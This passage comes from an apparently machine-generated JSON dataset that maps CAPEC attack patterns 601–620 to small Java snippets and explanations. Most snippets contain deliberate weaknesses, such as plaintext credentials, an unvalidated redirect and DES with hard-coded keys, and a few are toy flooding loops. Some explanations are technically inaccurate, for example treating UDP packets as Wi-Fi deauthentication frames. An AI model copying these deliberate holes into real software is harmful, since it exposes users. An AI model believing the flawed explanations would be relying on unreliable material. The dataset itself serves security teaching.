        "description": "This Java code snippet demonstrates a simple login system that is vulnerable to credential stuffing attacks. The system stores user credentials in a HashMap and tracks login attempts. If a user exceeds the maximum allowed failed login attempts (MAX_ATTEMPTS), their account is locked. This example highlights several weaknesses: \n1. Insufficiently Protected Credentials (CWE-522): The credentials are stored in plain text within a HashMap.\n2. Improper Restriction of Excessive Authentication Attempts (CWE-307): Although there is a limit on failed attempts, the system does not implement more sophisticated measures like CAPTCHA or account lockout durations.\n3. Use of Single-factor Authentication (CWE-308): The system relies solely on username and password for authentication.\n4. Use of Password System for Primary Authentication (CWE-309): The system uses passwords as the primary means of authentication, which can be easily compromised.\n5. Not Using Password Aging (CWE-262) and Password Aging with Long Expiration (CWE-263): The system does not enforce password changes or expiration policies.\n6. Reliance on a Single Factor in a Security Decision (CWE-654): The system relies solely on the password for authentication decisions, without additional factors like OTP or biometrics."
    },
    {
        "capec_id": "601",
        "capec_name": "Jamming",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class JammingExample {\n    public static void main(String[] args) throws IOException {\n        DatagramSocket socket = new DatagramSocket(9876);\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n\n        while (true) {\n            socket.receive(packet);\n            String received = new String(packet.getData(), 0, packet.getLength());\n            System.out.println(\"Received: \" + received);\n\n            // Simulate improper enforcement of message integrity\n            if (received.contains(\"legitimate\")) {\n                System.out.println(\"Legitimate message received.\");\n            } else {\n                System.out.println(\"Illegitimate message received, jamming in progress.\");\n            }\n\n            // Simulate cleartext transmission of sensitive information\n            String response = \"Sensitive data: 12345\";\n            DatagramPacket responsePacket = new DatagramPacket(response.getBytes(), response.length(), packet.getAddress(), packet.getPort());\n            socket.send(responsePacket);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple UDP server that listens for incoming messages on port 9876. It embodies the main idea of the CAPEC 'Jamming' by simulating a scenario where an adversary can disrupt communications. The code includes vulnerabilities related to the described CWEs: \n1. Improper enforcement of message integrity (CWE-924) is simulated by checking if the received message contains the word 'legitimate' without any cryptographic verification.\n2. Cleartext transmission of sensitive information (CWE-319) is demonstrated by sending a response containing sensitive data in plain text.\n\nThe code represents the concept of jamming by showing how an adversary can send illegitimate messages to disrupt the communication channel and potentially cause denial of service to legitimate users."
    },
    {
        "capec_id": "602",
        "capec_name": "DEPRECATED: Degradation",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.sql.Statement;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        String url = \"jdbc:mysql://localhost:3306/mydatabase\";\n        String user = \"root\";\n        String password = \"password\";\n\n        try {\n            // Using an obsolete function for database connection\n            Class.forName(\"com.mysql.jdbc.Driver\");\n            Connection conn = DriverManager.getConnection(url, user, password);\n            Statement stmt = conn.createStatement();\n            ResultSet rs = stmt.executeQuery(\"SELECT * FROM users\");\n\n            while (rs.next()) {\n                System.out.println(\"User: \" + rs.getString(\"username\"));\n            }\n\n            rs.close();\n            stmt.close();\n            conn.close();\n        } catch (ClassNotFoundException | SQLException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the use of an obsolete function, which is a common vulnerability described by CWE-477. The code uses the deprecated 'com.mysql.jdbc.Driver' for establishing a database connection, which suggests that the code has not been actively reviewed or maintained. This can lead to potential security risks, as deprecated functions may have known vulnerabilities that are not addressed in newer versions. The code connects to a MySQL database, executes a query to retrieve user data, and prints the usernames. This example embodies the main idea of the CAPEC by illustrating how the use of deprecated or obsolete functions can degrade the security and reliability of the software."
    },
    {
        "capec_id": "603",
        "capec_name": "Blockage",
        "code_snippet": "import java.util.ArrayList;\nimport java.util.List;\n\npublic class ResourceBlockage {\n    private static final int MAX_RESOURCES = 1000;\n    private List<Object> resources = new ArrayList<>();\n\n    public void allocateResource() {\n        // CWE-770: No limit on resource allocation\n        while (true) {\n            resources.add(new Object());\n            // CWE-400: Uncontrolled resource consumption\n            if (resources.size() > MAX_RESOURCES) {\n                System.out.println(\"Resource limit exceeded, system may fail.\");\n                break;\n            }\n        }\n    }\n\n    public static void main(String[] args) {\n        ResourceBlockage rb = new ResourceBlockage();\n        rb.allocateResource();\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary can block the delivery of an important system resource, causing the system to fail or stop working. The `allocateResource` method continuously allocates resources without proper limits (CWE-770), leading to uncontrolled resource consumption (CWE-400). When the number of allocated resources exceeds a predefined limit (MAX_RESOURCES), the system prints a warning message indicating potential failure. This represents the CAPEC concept of blockage by exhausting system resources, leading to a failure or stoppage of the system."
    },
    {
        "capec_id": "604",
        "capec_name": "Wi-Fi Jamming",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class WiFiJamming {\n    public static void main(String[] args) throws IOException {\n        // IP address of the target Wi-Fi network\n        String targetIP = \"192.168.1.1\";\n        int port = 12345; // Common port for Wi-Fi management frames\n        byte[] deauthFrame = new byte[1024]; // Deauthentication frame payload\n\n        // Fill the deauthFrame with data (this is just an example, real deauth frames have specific structure)\n        for (int i = 0; i < deauthFrame.length; i++) {\n            deauthFrame[i] = (byte) 0xFF;\n        }\n\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress address = InetAddress.getByName(targetIP);\n\n        // Continuously send deauthentication frames to the target\n        while (true) {\n            DatagramPacket packet = new DatagramPacket(deauthFrame, deauthFrame.length, address, port);\n            socket.send(packet);\n            System.out.println(\"Deauthentication frame sent to \" + targetIP);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic form of Wi-Fi jamming by continuously sending deauthentication frames to a target Wi-Fi network. The code creates a UDP socket and sends packets filled with deauthentication frame data to the specified IP address and port. This disrupts the communication between the Wi-Fi access point and its clients, preventing them from transmitting or receiving data. The code embodies the main idea of the CAPEC by actively transmitting on the Wi-Fi channel to interfere with network communication. The related CWEs are represented by the lack of message integrity verification (CWE-924), improper endpoint restriction (CWE-923), and cleartext transmission (CWE-319), which are common weaknesses that can be exploited in such attacks."
    },
    {
        "capec_id": "605",
        "capec_name": "Cellular Jamming",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class CellularJammingExample {\n    public static void main(String[] args) throws IOException {\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress address = InetAddress.getByName(\"192.168.1.1\"); // Target cell tower IP\n        byte[] buffer = new byte[1024];\n        \n        // CWE-319: Cleartext Transmission of Sensitive Information\n        String message = \"STATUS_UPDATE: Cell Tower Overloaded\";\n        buffer = message.getBytes();\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, 12345);\n        \n        // CWE-300: Channel Accessible by Non-Endpoint\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission\n        for (int i = 0; i < 1000; i++) { // Simulate jamming by sending multiple packets\n            socket.send(packet);\n        }\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a basic form of cellular jamming by sending multiple false status messages to a cell tower. The code uses a DatagramSocket to send UDP packets to a specified IP address (representing the cell tower). The message 'STATUS_UPDATE: Cell Tower Overloaded' is sent repeatedly to simulate an overload attack. This example embodies several CWEs: CWE-319 (Cleartext Transmission of Sensitive Information) as the message is sent in cleartext, CWE-300 (Channel Accessible by Non-Endpoint) and CWE-940 (Improper Verification of Source of a Communication Channel) as the cell tower does not verify the source of the messages, and CWE-924 (Improper Enforcement of Message Integrity During Transmission) as there is no integrity check on the messages being sent."
    },
    {
        "capec_id": "606",
        "capec_name": "Weakening of Cellular Encryption",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.SecureRandom;\n\npublic class CellularEncryption {\n    public static void main(String[] args) throws Exception {\n        // Simulate negotiation of encryption algorithm\n        String[] algorithms = {\"AES\", \"DES\", \"Blowfish\"};\n        String selectedAlgorithm = negotiateAlgorithm(algorithms);\n\n        // Generate key\n        SecretKey key = generateKey(selectedAlgorithm);\n\n        // Initialize cipher with selected algorithm\n        Cipher cipher = Cipher.getInstance(selectedAlgorithm);\n        cipher.init(Cipher.ENCRYPT_MODE, key);\n\n        // Encrypt data\n        String data = \"Sensitive Data\";\n        byte[] encryptedData = cipher.doFinal(data.getBytes());\n\n        System.out.println(\"Encrypted Data: \" + new String(encryptedData));\n    }\n\n    private static String negotiateAlgorithm(String[] algorithms) {\n        // Simulate a downgrade attack by selecting a weaker algorithm\n        return algorithms[1]; // Selects DES, which is weaker\n    }\n\n    private static SecretKey generateKey(String algorithm) throws NoSuchAlgorithmException {\n        KeyGenerator keyGen = KeyGenerator.getInstance(algorithm);\n        SecureRandom random = new SecureRandom();\n        keyGen.init(random);\n        return keyGen.generateKey();\n    }\n}",
        "description": "This Java code snippet simulates the weakening of cellular encryption by demonstrating an algorithm downgrade attack. The `negotiateAlgorithm` method simulates the negotiation process and intentionally selects a weaker algorithm (DES) instead of a stronger one (AES). The `generateKey` method generates a cryptographic key for the selected algorithm. The `main` method initializes a cipher with the selected algorithm and encrypts some sensitive data. This code embodies the main idea of CAPEC-Weakening of Cellular Encryption by showing how an attacker can force the use of a less secure encryption algorithm, making the communication vulnerable. The related CWEs are represented by the selection of a less secure algorithm (CWE-757), the use of a weaker encryption scheme (CWE-326), and the potential use of a broken or risky cryptographic algorithm (CWE-327)."
    },
    {
        "capec_id": "607",
        "capec_name": "Obstruction",
        "code_snippet": "import java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class ObstructionExample {\n    private Lock lock = new ReentrantLock();\n    private boolean isComponentAvailable = true;\n\n    public void accessComponent() {\n        if (lock.tryLock()) {\n            try {\n                if (isComponentAvailable) {\n                    // Simulate component interaction\n                    System.out.println(\"Component is being accessed.\");\n                } else {\n                    System.out.println(\"Component is unavailable.\");\n                }\n            } finally {\n                lock.unlock();\n            }\n        } else {\n            System.out.println(\"Component access obstructed.\");\n        }\n    }\n\n    public void obstructComponent() {\n        lock.lock();\n        try {\n            isComponentAvailable = false;\n            System.out.println(\"Component has been obstructed.\");\n        } finally {\n            lock.unlock();\n        }\n    }\n\n    public static void main(String[] args) {\n        ObstructionExample example = new ObstructionExample();\n        example.accessComponent(); // Expected to access the component\n        example.obstructComponent(); // Obstruct the component\n        example.accessComponent(); // Expected to show component is unavailable\n    }\n}",
        "description": "This Java code snippet demonstrates an obstruction attack on a system component. The `ObstructionExample` class uses a `ReentrantLock` to simulate the locking mechanism of a component. The `accessComponent` method attempts to access the component if it is available, while the `obstructComponent` method locks the component and sets its availability to false, simulating an obstruction. This represents the CAPEC concept of an attacker obstructing interactions between system components, causing them to be unavailable or degraded. The code also touches on related CWEs such as improper handling of faults (CWE-1332) and protection mechanism failure (CWE-693) by not properly managing the component's state and access control."
    },
    {
        "capec_id": "608",
        "capec_name": "Cryptanalysis of Cellular Encryption",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport javax.crypto.spec.SecretKeySpec;\nimport java.util.Base64;\n\npublic class CellularEncryption {\n    // CWE-321: Use of Hard-coded Cryptographic Key\n    private static final byte[] HARD_CODED_KEY = \"1234567890123456\".getBytes();\n\n    public static void main(String[] args) throws Exception {\n        String plaintext = \"Sensitive data\";\n\n        // CWE-327: Use of a Broken or Risky Cryptographic Algorithm (DES)\n        Cipher cipher = Cipher.getInstance(\"DES\");\n        SecretKey secretKey = new SecretKeySpec(HARD_CODED_KEY, \"DES\");\n\n        // Encrypt the data\n        cipher.init(Cipher.ENCRYPT_MODE, secretKey);\n        byte[] encryptedData = cipher.doFinal(plaintext.getBytes());\n        String encryptedBase64 = Base64.getEncoder().encodeToString(encryptedData);\n        System.out.println(\"Encrypted Data: \" + encryptedBase64);\n\n        // Decrypt the data\n        cipher.init(Cipher.DECRYPT_MODE, secretKey);\n        byte[] decryptedData = cipher.doFinal(Base64.getDecoder().decode(encryptedBase64));\n        String decryptedText = new String(decryptedData);\n        System.out.println(\"Decrypted Data: \" + decryptedText);\n    }\n}",
        "description": "This Java code snippet demonstrates the use of a broken or risky cryptographic algorithm (DES) and a hard-coded cryptographic key, which are both vulnerabilities described in the CAPEC and related CWEs. The code encrypts and decrypts a piece of sensitive data using DES, a known weak encryption algorithm, and a hard-coded key. This represents the main idea of the CAPEC, which is the vulnerability of cellular encryption to cryptanalysis, especially when weak algorithms and poor key management practices are used. The use of DES and a hard-coded key makes the encrypted data susceptible to attacks, illustrating the risks associated with inadequate encryption strength and poor cryptographic practices."
    },
    {
        "capec_id": "609",
        "capec_name": "Cellular Traffic Intercept",
        "code_snippet": "import java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class VulnerableCommunication {\n    public static void main(String[] args) {\n        try {\n            // CWE-319: Cleartext Transmission of Sensitive Information\n            String sensitiveData = \"username=admin&password=admin123\";\n            URL url = new URL(\"http://example.com/login\");\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"POST\");\n            connection.setDoOutput(true);\n\n            // CWE-311: Missing Encryption of Sensitive Data\n            OutputStream os = connection.getOutputStream();\n            os.write(sensitiveData.getBytes());\n            os.flush();\n            os.close();\n\n            int responseCode = connection.getResponseCode();\n            System.out.println(\"Response Code: \" + responseCode);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable communication scenario where sensitive information is transmitted in cleartext over an HTTP connection. The code sends a username and password to a server without encryption (CWE-319: Cleartext Transmission of Sensitive Information) and does not encrypt the sensitive data before transmission (CWE-311: Missing Encryption of Sensitive Data). This makes it susceptible to interception by malicious actors, embodying the main idea of the CAPEC 'Cellular Traffic Intercept'. The code also lacks proper verification of the communication channel's source and message integrity, which are additional weaknesses related to the CAPEC."
    },
    {
        "capec_id": "610",
        "capec_name": "Cellular Data Injection",
        "code_snippet": "import java.io.OutputStream;\nimport java.net.Socket;\nimport java.util.Random;\n\npublic class CellularDataInjection {\n    public static void main(String[] args) {\n        String sensitiveData = \"UserPassword123\"; // CWE-201: Insertion of Sensitive Information Into Sent Data\n        String cleartextMessage = \"Hello, this is a test message.\"; // CWE-319: Cleartext Transmission of Sensitive Information\n        String injectedData = sensitiveData + cleartextMessage;\n\n        try {\n            Socket socket = new Socket(\"example.com\", 80);\n            OutputStream outputStream = socket.getOutputStream();\n            outputStream.write(injectedData.getBytes()); // CWE-924: Improper Enforcement of Message Integrity During Transmission\n            outputStream.flush();\n            socket.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    // CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n    public void activateDebugMode() {\n        boolean debugMode = new Random().nextBoolean();\n        if (debugMode) {\n            System.out.println(\"Debug mode activated.\");\n        }\n    }\n\n    // CWE-406: Insufficient Control of Network Message Volume (Network Amplification)\n    public void sendLargeVolumeOfData() {\n        try {\n            Socket socket = new Socket(\"example.com\", 80);\n            OutputStream outputStream = socket.getOutputStream();\n            for (int i = 0; i < 10000; i++) {\n                outputStream.write((\"Message \" + i).getBytes());\n            }\n            outputStream.flush();\n            socket.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where cellular data injection vulnerabilities can occur. The main function sends a message that includes sensitive information (CWE-201) in cleartext (CWE-319) without ensuring message integrity (CWE-924). Additionally, there are methods to activate debug mode at runtime (CWE-1313) and to send a large volume of data (CWE-406), which can be exploited by adversaries to disrupt communications or conduct surveillance operations. The code highlights how these weaknesses can be combined to embody the main idea of cellular data injection."
    },
    {
        "capec_id": "611",
        "capec_name": "BitSquatting",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/redirect\")\npublic class RedirectServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String targetUrl = request.getParameter(\"url\");\n        if (targetUrl != null && !targetUrl.isEmpty()) {\n            response.sendRedirect(targetUrl);\n        } else {\n            response.sendRedirect(\"https://trusted-domain.com\");\n        }\n    }\n}\n",
        "description": "This Java servlet code demonstrates a potential BitSquatting vulnerability by allowing user-controlled input to specify a URL for redirection. The 'targetUrl' parameter is taken directly from the request and used in the 'sendRedirect' method without validation. This can be exploited by an attacker who registers a domain name that is one bit different from a trusted domain, leveraging random memory errors to redirect traffic to a malicious site. The code also embodies CWE-601 (Open Redirect) by accepting user input for the redirection URL, CWE-84 (Improper Neutralization of Encoded URI Schemes) by not validating the URL, and CWE-598 (Use of GET Request Method With Sensitive Query Strings) by using the GET method to process the request."
    },
    {
        "capec_id": "612",
        "capec_name": "WiFi MAC Address Tracking",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class WiFiMACAddressTracker {\n    public static void main(String[] args) throws Exception {\n        DatagramSocket socket = new DatagramSocket(8888);\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n\n        while (true) {\n            socket.receive(packet);\n            String receivedData = new String(packet.getData(), 0, packet.getLength());\n            String macAddress = extractMACAddress(receivedData);\n            if (macAddress != null) {\n                System.out.println(\"Tracked MAC Address: \" + macAddress);\n            }\n        }\n    }\n\n    private static String extractMACAddress(String data) {\n        // Simplified extraction logic for demonstration purposes\n        if (data.contains(\"MAC:\")) {\n            return data.substring(data.indexOf(\"MAC:\") + 4, data.indexOf(\"MAC:\") + 21);\n        }\n        return null;\n    }\n}",
        "description": "This Java code snippet demonstrates a basic implementation of a WiFi MAC address tracker. The program listens for incoming UDP packets on port 8888, extracts MAC addresses from the received data, and prints them to the console. This embodies the main idea of the CAPEC 'WiFi MAC Address Tracking' by passively listening for WiFi messages and logging the associated MAC addresses. The code also touches on related CWEs: it transmits sensitive information (CWE-201), does not verify the identity of actors (CWE-300), and could be susceptible to race conditions (CWE-421). The code is simplified for demonstration purposes and does not include robust error handling or security measures."
    },
    {
        "capec_id": "613",
        "capec_name": "WiFi SSID Tracking",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class WiFiSSIDTracker {\n    public static void main(String[] args) throws Exception {\n        DatagramSocket socket = new DatagramSocket(9999);\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n\n        while (true) {\n            socket.receive(packet);\n            String receivedData = new String(packet.getData(), 0, packet.getLength());\n            if (receivedData.contains(\"SSID:\")) {\n                String ssid = receivedData.split(\"SSID:\")[1].split(\" \")[0];\n                System.out.println(\"Captured SSID: \" + ssid);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple WiFi SSID tracker. It listens for incoming UDP packets on port 9999, which is a common method for capturing WiFi management frames in a real-world scenario. When a packet is received, it checks if the packet contains the string 'SSID:'. If found, it extracts and prints the SSID. This code embodies the main idea of CAPEC-201, where an attacker passively listens for WiFi management frames to capture SSIDs. The code also reflects CWE-201 by transmitting sensitive information (SSID) without proper security measures, CWE-300 by not verifying the identity of the sender, and CWE-1290 by potentially allowing unauthorized access to the SSID data."
    },
    {
        "capec_id": "614",
        "capec_name": "Rooting SIM Cards",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\nimport java.util.Base64;\n\npublic class SimCardAttack {\n    private static final String ALGORITHM = \"DES\";\n    private static final String DES_KEY = \"12345678\"; // Weak DES key\n\n    public static void main(String[] args) {\n        try {\n            String payload = \"Malicious Java Applet\";\n            String encryptedPayload = encryptPayload(payload, DES_KEY);\n            sendBinarySMS(encryptedPayload);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static String encryptPayload(String payload, String key) throws Exception {\n        Cipher cipher = Cipher.getInstance(ALGORITHM);\n        SecretKeySpec keySpec = new SecretKeySpec(key.getBytes(), ALGORITHM);\n        cipher.init(Cipher.ENCRYPT_MODE, keySpec);\n        byte[] encryptedBytes = cipher.doFinal(payload.getBytes());\n        return Base64.getEncoder().encodeToString(encryptedBytes);\n    }\n\n    private static void sendBinarySMS(String encryptedPayload) {\n        // Simulate sending a binary SMS to the SIM card\n        System.out.println(\"Sending binary SMS: \" + encryptedPayload);\n        // In a real scenario, this would involve using a GSM modem or similar to send the SMS\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of the 'Rooting SIM Cards' attack described in the CAPEC. The code uses a weak DES key (CWE-327: Use of a Broken or Risky Cryptographic Algorithm) to encrypt a malicious payload, which is then sent as a binary SMS to the SIM card. The DES key is hardcoded and weak, making it susceptible to cracking (CWE-326: Inadequate Encryption Strength). The `sendBinarySMS` method simulates the process of sending the encrypted payload to the SIM card, which would execute the payload as a Java applet with potentially harmful capabilities. This example highlights the risks associated with using weak cryptographic algorithms and the potential for abuse in OTA updates to SIM cards."
    },
    {
        "capec_id": "615",
        "capec_name": "Evil Twin Wi-Fi Attack",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class VulnerableWiFiClient {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/login\"); // CWE-319: Cleartext Transmission of Sensitive Information\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n\n            String payload = \"username=admin&password=admin123\";\n            OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());\n            writer.write(payload);\n            writer.flush();\n            writer.close();\n\n            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable Wi-Fi client that connects to a server and transmits sensitive information (username and password) in cleartext (CWE-319). The code does not verify the identity of the server (CWE-923, CWE-940), nor does it ensure the integrity of the communication channel (CWE-300, CWE-924). This makes it susceptible to an Evil Twin Wi-Fi Attack, where an adversary sets up a rogue Wi-Fi access point to intercept and capture the transmitted data. The code highlights the risks associated with improper handling of communication channels and the transmission of sensitive information without adequate security measures."
    },
    {
        "capec_id": "616",
        "capec_name": "Establish Rogue Location",
        "code_snippet": "import java.io.*;\n\npublic class RogueLocationExample {\n    public static void main(String[] args) {\n        String filePath = \"/trusted/path/config.txt\";\n        if (args.length > 0) {\n            filePath = args[0]; // CWE-426: Untrusted Search Path\n        }\n        try {\n            BufferedReader reader = new BufferedReader(new FileReader(filePath));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line); // CWE-200: Exposure of Sensitive Information\n            }\n            reader.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an adversary can establish a rogue location by providing a malicious file path as an argument. The code reads and prints the contents of the file specified by the user, which can lead to the exposure of sensitive information (CWE-200) if the file contains such data. The main idea of the CAPEC is represented by allowing an untrusted search path (CWE-426) to be used, which can point to a malicious resource instead of the legitimate one. This can result in improper verification of the source (CWE-940) and potentially create emergent resources (CWE-1229) or leak private resources (CWE-402)."
    },
    {
        "capec_id": "617",
        "capec_name": "Cellular Rogue Base Station",
        "code_snippet": "import java.net.Socket;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\n\npublic class RogueBaseStation {\n    private static final String TRUSTED_BASE_STATION_IP = \"192.168.1.1\";\n    private static final int BASE_STATION_PORT = 12345;\n\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(TRUSTED_BASE_STATION_IP, BASE_STATION_PORT);\n            InputStream input = socket.getInputStream();\n            OutputStream output = socket.getOutputStream();\n\n            // Simulate communication with the base station\n            byte[] buffer = new byte[1024];\n            int bytesRead = input.read(buffer);\n            String message = new String(buffer, 0, bytesRead);\n\n            // Improper verification of the source of the communication channel\n            if (message.contains(\"AUTH_REQUEST\")) {\n                // Assume the message is from a trusted source without verification\n                output.write(\"AUTH_RESPONSE\".getBytes());\n            }\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified scenario where a device connects to a base station without properly verifying the source of the communication channel. The device connects to a predefined IP address and port, simulating communication with a base station. When an 'AUTH_REQUEST' message is received, the device responds with 'AUTH_RESPONSE' without verifying the authenticity of the source. This represents the vulnerability described in CAPEC-610 (Cellular Rogue Base Station) and related CWEs, such as CWE-940 (Improper Verification of Source of a Communication Channel) and CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints). The code highlights the risk of an attacker setting up a rogue base station to intercept or manipulate communications."
    },
    {
        "capec_id": "618",
        "capec_name": "Cellular Broadcast Message Request",
        "code_snippet": "import java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.io.OutputStream;\nimport java.io.InputStream;\n\npublic class CellularBroadcastAttack {\n    public static void main(String[] args) {\n        String targetPhoneNumber = \"+1234567890\";\n        String broadcastMessage = \"Emergency Alert!\";\n        String locationAreaCode = \"12345\";\n\n        try {\n            // Construct the URL for the broadcast message request\n            URL url = new URL(\"http://cellular-network.example.com/broadcast\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n\n            // Prepare the payload with sensitive information\n            String payload = \"phoneNumber=\" + targetPhoneNumber + \"&message=\" + broadcastMessage + \"&lac=\" + locationAreaCode;\n\n            // Send the payload\n            OutputStream os = conn.getOutputStream();\n            os.write(payload.getBytes());\n            os.flush();\n            os.close();\n\n            // Check the response\n            InputStream is = conn.getInputStream();\n            byte[] response = new byte[1024];\n            int bytesRead = is.read(response);\n            String responseStr = new String(response, 0, bytesRead);\n            System.out.println(\"Response: \" + responseStr);\n\n            is.close();\n            conn.disconnect();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a Cellular Broadcast Message Request attack. The attacker uses knowledge of the target's phone number and location area code (LAC) to send a broadcast message through a simulated cellular network endpoint. The code constructs an HTTP POST request containing sensitive information (phone number and LAC) and sends it to the network. The response is then read to determine if the broadcast message was successfully sent, which could help the attacker verify the target's location. This snippet embodies the main idea of CAPEC-Cellular Broadcast Message Request and highlights several related CWEs: CWE-201 (Insertion of Sensitive Information Into Sent Data), CWE-924 (Improper Enforcement of Message Integrity During Transmission), CWE-940 (Improper Verification of Source of a Communication Channel), and CWE-300 (Channel Accessible by Non-Endpoint)."
    },
    {
        "capec_id": "619",
        "capec_name": "Signal Strength Tracking",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.util.Arrays;\n\npublic class SignalStrengthTracker {\n    private static final int PORT = 9876;\n    private static final String TARGET_MAC = \"00:14:22:01:23:45\";\n\n    public static void main(String[] args) throws Exception {\n        DatagramSocket socket = new DatagramSocket(PORT);\n        byte[] receiveData = new byte[1024];\n\n        while (true) {\n            DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n            socket.receive(receivePacket);\n            String receivedMessage = new String(receivePacket.getData(), 0, receivePacket.getLength());\n\n            // CWE-201: Insertion of Sensitive Information Into Sent Data\n            if (receivedMessage.contains(TARGET_MAC)) {\n                InetAddress IPAddress = receivePacket.getAddress();\n                int port = receivePacket.getPort();\n                String response = \"Tracking signal strength for MAC: \" + TARGET_MAC;\n                DatagramPacket sendPacket = new DatagramPacket(response.getBytes(), response.length(), IPAddress, port);\n                socket.send(sendPacket);\n            }\n\n            // CWE-940: Improper Verification of Source of a Communication Channel\n            if (!verifySource(receivePacket.getAddress())) {\n                System.out.println(\"Warning: Unverified source\");\n                continue;\n            }\n\n            // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n            if (!verifyMessageIntegrity(receivedMessage)) {\n                System.out.println(\"Warning: Message integrity compromised\");\n                continue;\n            }\n        }\n    }\n\n    private static boolean verifySource(InetAddress address) {\n        // Dummy verification for example purposes\n        return address.getHostAddress().startsWith(\"192.168.\");\n    }\n\n    private static boolean verifyMessageIntegrity(String message) {\n        // Dummy integrity check for example purposes\n        return message.length() > 0;\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a signal strength tracking system. The main idea is to monitor incoming UDP packets and check for a specific target MAC address. If the target MAC address is found, the system sends a response indicating that it is tracking the signal strength for that MAC address. The code also includes checks for common weaknesses: CWE-201 (Insertion of Sensitive Information Into Sent Data) by sending sensitive information (MAC address) in the response, CWE-940 (Improper Verification of Source of a Communication Channel) by verifying the source of the incoming packet, and CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel) by checking the integrity of the received message. This example highlights the potential vulnerabilities in a signal strength tracking system and the importance of addressing these weaknesses."
    },
    {
        "capec_id": "620",
        "capec_name": "Drop Encryption Level",
